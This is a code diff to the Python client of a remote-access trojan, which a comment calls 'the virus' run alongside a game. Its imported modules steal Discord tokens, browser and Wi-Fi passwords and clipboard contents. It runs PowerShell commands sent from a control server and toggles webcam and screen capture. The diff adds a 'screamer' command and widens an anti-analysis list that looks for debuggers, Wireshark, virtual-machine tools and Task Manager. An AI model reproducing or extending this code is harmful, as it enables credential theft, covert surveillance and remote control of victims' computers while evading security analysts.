@@ -9,14 +9,20 @@ import requests
 import socketio
 from PIL import Image
 from pyautogui import screenshot
+from tendo import singleton
+import os
+import win32api
+import win32com.client
+import win32security
+import ntsecuritycon as con
 
 from modules.discordgrabber import GetDiscordTokens
 from modules.pcinfo import System_information
 from modules.wifipasswordsgraber import getPasswords
 from modules.clipboardlogger import logger
 from modules.getBrowserPasswords import fetch_browser_passwords
+from modules.screamer import show_screamer
 
-from tendo import singleton
 #this code is intended to create a single instance of the programme
 #You can do something like this:
 #run the game again if the programme starts again, but the virus only ran once
@@ -25,11 +31,13 @@ try:
 	print("Starting")
 except:
 	print("Not started!")
-	exit()
+	sys.exit()
 
 # Settings!!!
 remote_server = '127.0.0.1:5000'
 protocol = 'http'
+
+#don't touch this
 enableCamera = False
 enableScreen = False
 
@@ -76,24 +84,42 @@ while True:
 
 previous_clipboard_content = ''
 
-blacklisted_processes = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "taskmgr", "processhacker", "vboxservice", "df5serv", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
+import psutil
 
-#"cmd",
+blacklisted_processes = [
+	"httpdebuggerui", "wireshark", "fiddler", "regedit", "taskmgr", "processhacker", "vboxservice",
+	"df5serv", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser",
+	"vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_tools", "xenservice",
+	"qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", "cmd", "prl_cc"
+]
+
 
 def is_blacklisted_processes_open():
-	# Check if Task Manager is running
-	for proc in psutil.process_iter(['name']):
-		if proc.info['name'].replace('.exe', '').lower() in blacklisted_processes:
-			return True
+	for proc in psutil.process_iter(['name', 'exe']):
+		try:
+			proc_info = proc.as_dict(attrs=['name', 'exe'])
+			proc_name = proc_info['name'].replace('.exe', '').lower()
+			proc_path = proc_info['exe']
+
+			# Проверяем, есть ли процесс в черном списке
+			if proc_name in blacklisted_processes:
+				# Проверяем, не находится ли процесс в директории fake_processess
+				if proc_path and "fake_processess" in proc_path:
+					continue
+				else:
+					return True
+
+		except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+			pass
 	return False
 
 @sio.on('send_console')
 def send_console(data):
 	print(data)
 
-	clientid = data['clientId']
+	targetClientId = data['clientId']
 
-	if clientid != clientId:
+	if targetClientId != clientId:
 		return
 
 	if data['command'] == 'error':
@@ -115,6 +141,10 @@ def send_console(data):
 		powershell_command = data['text']
 		result = subprocess.run(['powershell', '-Command', powershell_command], capture_output=True, text=True)
 		print("Output:", result.stdout)
+
+	elif data['command'] == 'screamer':
+		duration = data['text']
+		show_screamer(float(duration))
 	else:
 		pass
 
@@ -125,7 +155,6 @@ def toggle_camera(json):
 	state = int(json['state'])
 	if clientid == clientId:
 		global enableCamera
-
 		enableCamera = bool(state)
 
 
@@ -136,7 +165,6 @@ def toggle_screen(json):
 	state = int(json['state'])
 	if clientid == clientId:
 		global enableScreen
-
 		enableScreen = bool(state)
 
 while True:
